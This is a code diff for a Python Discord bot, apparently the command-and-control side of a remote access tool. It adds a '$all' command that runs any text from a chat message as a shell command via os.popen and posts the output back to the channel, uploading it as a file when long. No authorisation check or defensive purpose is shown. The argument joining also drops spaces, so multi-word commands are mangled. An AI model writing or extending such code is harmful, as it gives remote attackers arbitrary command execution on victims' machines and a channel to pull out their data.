@@ -57,6 +57,17 @@ async def on_message(message):
         else:
             selected = False
 
+    if message.content.startswith('$all'):
+        msg = message.content.split()
+        cmd = ''.join((msg[1:]))
+        out = os.popen(cmd).read()
+        if len(out) > 2000:
+            with open('message.txt', 'w') as f:
+                f.write(out)
+            await message.channel.send(file=discord.File('message.txt'))
+        else:
+            await message.channel.send(out)
+
     if selected == True:
         if message.content.startswith('$cmd'):
             msg = message.content.split()
